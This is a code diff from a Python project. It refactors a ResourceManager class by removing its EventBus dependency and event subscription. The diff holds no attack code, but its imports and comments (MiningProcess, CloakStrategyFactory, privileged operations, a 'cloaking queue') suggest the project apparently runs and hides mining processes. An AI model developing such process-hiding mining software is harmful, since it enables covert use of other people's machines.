@@ -24,7 +24,7 @@ from .utils import MiningProcess
 from .resource_control import ResourceControlFactory, CloakStrategyFactory
 from .auxiliary_modules.interfaces import IResourceManager
 from .auxiliary_modules.models import ConfigModel
-from .auxiliary_modules.event_bus import EventBus
+# 🗑️ EventBus import removed - using DirectPIDRegistry instead
 from .privileged_operations import get_privileged_manager
 from .unified_logging import get_unified_logger
 from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
@@ -230,7 +230,7 @@ class ResourceManager(IResourceManager):
     _instance = None
     _instance_lock = threading.Lock()
 
-    def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
+    def __new__(cls, config: ConfigModel, event_bus=None, logger: logging.Logger = None):
         with cls._instance_lock:
             if cls._instance is None:
                 cls._instance = super(ResourceManager, cls).__new__(cls)
@@ -283,13 +283,12 @@ class ResourceManager(IResourceManager):
         # ✅ ENHANCED: Strategy metrics tracking for success/failure monitoring
         self.strategy_metrics: Dict[int, Dict[str, Any]] = {}  # PID -> metrics data
         
-        # ✅ ERROR MANAGEMENT: Initialize error reporter with EventBus integration
-        self.error_reporter = get_error_reporter(event_bus)
+        # ✅ ERROR MANAGEMENT: Initialize error reporter without EventBus
+        self.error_reporter = get_error_reporter(None)
 
         self.logger.info("ResourceManager.__init__ (simplified with unified cloaking queue)")
 
-        # ✅ SIMPLIFIED: Essential EventBus subscriptions only
-        self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
+        # 🗑️ EventBus subscriptions removed - using DirectPIDRegistry observers instead
     
     def _validate_configuration(self, config: ConfigModel) -> ConfigModel:
         """
